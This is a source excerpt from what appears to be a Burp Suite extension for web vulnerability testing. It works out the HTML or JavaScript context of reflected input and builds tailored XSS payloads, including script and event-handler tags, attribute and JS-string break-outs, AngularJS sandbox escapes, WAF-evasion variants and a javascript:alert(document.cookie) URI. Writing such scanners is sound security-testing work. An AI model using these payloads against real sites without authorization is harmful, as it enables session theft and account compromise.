def _xss_html_encoded(body, ch):
    """Return True if ch appears HTML-encoded somewhere (entity form)."""
    ents = {
        "<": ["&lt;", "&#60;", "&#x3c;", "&#x3C;"],
        ">": ["&gt;", "&#62;", "&#x3e;", "&#x3E;"],
        "\"": ["&quot;", "&#34;", "&#x22;"],
        "'": ["&#39;", "&apos;", "&#x27;"],
    }.get(ch, [])
    bl = body.lower()
    return any(e.lower() in bl for e in ents)


def _xss_context_at(body, idx, mlen):
    """Classify the HTML/JS context of a reflection at body[idx:idx+mlen].
    Returns a dict: kind, quote, attr, is_uri, rcdata_tag, tag."""
    pre = body[:idx]
    pre_l = pre.lower()

    # --- inside <script> ? (RAWTEXT) ---
    s_open = pre_l.rfind("<script")
    s_close = pre_l.rfind("</script")
    if s_open != -1 and s_open > s_close:
        # We are inside a <script> block. Determine JS string context by scanning
        # the script text from just after the opening tag's '>' to idx.
        gt = pre.find(">", s_open)
        seg = pre[gt + 1:] if gt != -1 else pre[s_open:]
        q = ""
        i = 0
        n = len(seg)
        while i < n:
            c = seg[i]
            if c == "\\":
                i += 2
                continue
            if q:
                if c == q:
                    q = ""
            else:
                if c in ("'", "\"", "`"):
                    q = c
            i += 1
        if q == "`":
            return {"kind": "js_template", "quote": "`", "attr": "", "is_uri": False,
                    "rcdata_tag": "", "tag": "script"}
        if q in ("'", "\""):
            return {"kind": "js_string", "quote": q, "attr": "", "is_uri": False,
                    "rcdata_tag": "", "tag": "script"}
        return {"kind": "js_code", "quote": "", "attr": "", "is_uri": False,
                "rcdata_tag": "", "tag": "script"}

    # --- inside an HTML comment ? ---
    c_open = pre.rfind("<!--")
    c_close = pre.rfind("-->")
    if c_open != -1 and c_open > c_close:
        return {"kind": "comment", "quote": "", "attr": "", "is_uri": False,
                "rcdata_tag": "", "tag": ""}

    # --- inside RCDATA element (title/textarea/style) ? ---
    for _rc in ("title", "textarea", "style"):
        o = pre_l.rfind("<" + _rc)
        c = pre_l.rfind("</" + _rc)
        if o != -1 and o > c:
            return {"kind": "rcdata", "quote": "", "attr": "", "is_uri": False,
                    "rcdata_tag": _rc, "tag": _rc}

    # --- inside a tag (attribute area) vs HTML text ---
    last_lt = pre.rfind("<")
    last_gt = pre.rfind(">")
    if last_lt > last_gt:
        # We are inside a start tag. Find tag name + the attribute we sit in.
        tagseg = pre[last_lt:]
        tagseg_l = tagseg.lower()
        m_tag = re.match(r"<\s*([a-zA-Z0-9]+)", tagseg)
        tag = m_tag.group(1).lower() if m_tag else ""
        # Quote state within the tag up to idx
        q = ""
        i = 0
        n = len(tagseg)
        while i < n:
            c = tagseg[i]
            if q:
                if c == q:
                    q = ""
            else:
                if c in ("'", "\""):
                    q = c
            i += 1
        # Attribute name = last token before the '=' that precedes our value
        attr = ""
        eqpos = tagseg.rfind("=")
        if eqpos != -1:
            _am = re.search(r"([a-zA-Z0-9_:\-]+)\s*=\s*[\"']?[^\"'=]*$", tagseg)
            if _am:
                attr = _am.group(1).lower()
        is_uri = attr in ("href", "src", "action", "formaction", "data",
                          "poster", "xlink:href")
        return {"kind": "attr", "quote": q, "attr": attr, "is_uri": is_uri,
                "rcdata_tag": "", "tag": tag}

    # --- default: HTML text content ---
    return {"kind": "html_text", "quote": "", "attr": "", "is_uri": False,
            "rcdata_tag": "", "tag": ""}


def _xss_payloads_for(ctx, surv, is_angular):
    """Build an ordered list of (payload, exec_token, desc) tailored to the
    context dict + the char-survival map. exec_token is the un-encoded signature
    used to verify the payload would execute."""
    out = []
    has_lt = surv.get("<", False)
    has_gt = surv.get(">", False)
    angle = has_lt and has_gt

    def add(p, tok, d):
        out.append((p, tok, d))

    kind = ctx["kind"]

    # AngularJS sandbox: works even when angle brackets are encoded.
    if is_angular:
        add("{{$on.constructor('alert(1)')()}}", "$on.constructor('alert(1)')",
            "AngularJS expression (ng-app present)")
        add("{{constructor.constructor('alert(1)')()}}",
            "constructor.constructor('alert(1)')", "AngularJS constructor sandbox escape")

    if kind in ("html_text", "comment", "rcdata"):
        prefix = ""
        if kind == "comment":
            prefix = "-->"   # close the comment first, then open a tag
        if kind == "rcdata":
            prefix = "</" + (ctx.get("rcdata_tag") or "textarea") + ">"
        # NOTE: we ALWAYS emit angle-bracket payloads. The char-survival probe is
        # only a hint -- a single combined probe can be encoded/blocked while a real
        # payload reflects fine, so we let un-encoded-reflection verification decide.
        base_pre = prefix
        add(base_pre + "<script>alert(1)</script>", "<script>alert(1)</script>", "HTML text: script tag")
        add(base_pre + "<svg onload=alert(1)>", "<svg onload=alert(1)", "HTML text: svg onload")
        add(base_pre + "<img src=1 onerror=alert(1)>", "<img src=1 onerror=alert(1)", "HTML text: img onerror")
        add(base_pre + "<body onload=alert(1)>", "<body onload=alert(1)", "HTML text: body onload")
        add(base_pre + "<details open ontoggle=alert(1)>", "<details open ontoggle=alert(1)", "HTML text: details ontoggle")
        # WAF-friendly alternatives (custom tag + autofocus/onfocus, svg/animatetransform)
        add(base_pre + "<xss id=x tabindex=1 onfocus=alert(1)></xss>#x",
            "<xss id=x tabindex=1 onfocus=alert(1)", "Custom tag onfocus (all-tags-blocked-except-custom)")
        add(base_pre + "<svg><animatetransform onbegin=alert(1)>",
            "<animatetransform onbegin=alert(1)", "SVG animatetransform onbegin (some-SVG-allowed)")
        return out

    if kind == "attr":
        q = ctx["quote"]
        if ctx["is_uri"]:
            add("javascript:alert(1)", "javascript:alert(1)", "URI attribute (href/src): javascript scheme")
            add("javascript:alert(document.cookie)", "javascript:alert(document.cookie)",
                "URI attribute: javascript:alert(document.cookie)")
        if q == "\"":
            if angle:
                add("\"><svg onload=alert(1)>", "<svg onload=alert(1)", "Break dq attr -> svg")
                add("\"><img src=1 onerror=alert(1)>", "<img src=1 onerror=alert(1)", "Break dq attr -> img")
            add("\"onmouseover=\"alert(1)", "onmouseover=\"alert(1)", "Inject event handler (dq attr)")
            add("\" autofocus onfocus=\"alert(1)", "onfocus=\"alert(1)", "autofocus+onfocus (dq attr)")
            add("\"accesskey=\"X\"onclick=\"alert(1)", "onclick=\"alert(1)", "accesskey onclick (canonical/link)")
        elif q == "'":
            if angle:
                add("'><svg onload=alert(1)>", "<svg onload=alert(1)", "Break sq attr -> svg")
            add("'onmouseover='alert(1)", "onmouseover='alert(1)", "Inject event handler (sq attr)")
            add("' autofocus onfocus='alert(1)", "onfocus='alert(1)", "autofocus+onfocus (sq attr)")
        else:
            # unquoted attribute
            if angle:
                add("><svg onload=alert(1)>", "<svg onload=alert(1)", "Break unquoted attr -> svg")
            add(" onmouseover=alert(1) ", "onmouseover=alert(1)", "Event handler (unquoted attr)")
            add(" autofocus onfocus=alert(1) ", "onfocus=alert(1)", "autofocus+onfocus (unquoted attr)")
        return out

    if kind == "js_string":
        q = ctx["quote"]
        add(q + "-alert(1)-" + q, q + "-alert(1)-" + q, "Break JS string (arithmetic)")
        add(q + ";alert(1)//", q + ";alert(1)//", "Break JS string (statement)")
        add(q + "-alert(1)//", q + "-alert(1)//", "Break JS string (arith + comment)")
        if angle:
            add("</script><script>alert(1)</script>", "</script><script>alert(1)</script>",
                "Break out of <script> entirely (quotes escaped)")
        return out

    if kind == "js_template":
        add("${alert(1)}", "${alert(1)}", "Template literal expression")
        if angle:
            add("</script><script>alert(1)</script>", "</script><script>alert(1)</script>",
                "Break out of <script> (template)")
        return out

    if kind == "js_code":
        add("alert(1)", "alert(1)", "Raw JS code context")
        add(";alert(1);", ";alert(1);", "Statement injection")
        if angle:
            add("</script><script>alert(1)</script>", "</script><script>alert(1)</script>",
                "Break out of <script>")
        return out

    return out


def _read_wordlist(path):
    """Read a payload file; return list of non-empty, non-comment lines."""
    try:
        lines = []
        with open(path, 'r') as _wlf:
            for ln in _wlf:
                ln = ln.rstrip("\r\n")
                if ln and not ln.startswith("#"):
                    lines.append(ln)
        return lines
    except Exception:
        return []


# ===========================================================================
# Threading helpers - all Swing updates MUST go through these
# ===========================================================================
class _BgRunnable(Runnable):
    def __init__(self, fn):
        self._fn = fn

    def run(self):
        try:
            self._fn()
        except Exception as e:
            print("[VAPT bg-thread error] {}".format(e))
        except JavaException as je:
            print("[VAPT bg-thread Java error] {}".format(je))


class _UiRunnable(Runnable):
    def __init__(self, fn):
        self._fn = fn

    def run(self):
        try:
            self._fn()
        except Exception as e:
            print("[VAPT EDT error] {}".format(e))


def _bg(fn):
    """Run fn in a background daemon thread."""
    t = Thread(_BgRunnable(fn))
    t.setDaemon(True)
    t.start()
    return t


def _ui(fn):
    """Run fn on the Swing Event Dispatch Thread."""
    SwingUtilities.invokeLater(_UiRunnable(fn))


def _append(ta, text):
    """Thread-safe append text + newline to a JTextArea."""
    def _do():
        ta.append(text + "\n")
        ta.setCaretPosition(ta.getDocument().getLength())
    _ui(_do)


def _clear(ta):
    """Thread-safe clear of a JTextArea."""
    _ui(lambda: ta.setText(""))


def _enable(btn, state):
    """Thread-safe enable/disable of a JButton."""
    _ui(lambda: btn.setEnabled(state))


